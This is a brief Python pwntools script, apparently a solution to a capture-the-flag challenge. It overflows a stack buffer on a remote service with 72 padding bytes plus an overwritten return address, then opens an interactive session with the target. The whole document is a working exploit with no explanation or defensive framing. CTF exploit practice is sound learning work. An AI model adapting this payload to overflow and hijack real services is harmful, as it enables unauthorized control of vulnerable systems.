from pwn import *

# Target details
host = "pwn.h7tex.com"
port = 41944

offset = 72
target = p64(0x401216)

payload = b'A' * offset + target

p = remote(host, port)
p.sendlineafter(b'State your name for the log:\n', payload)
p.interactive()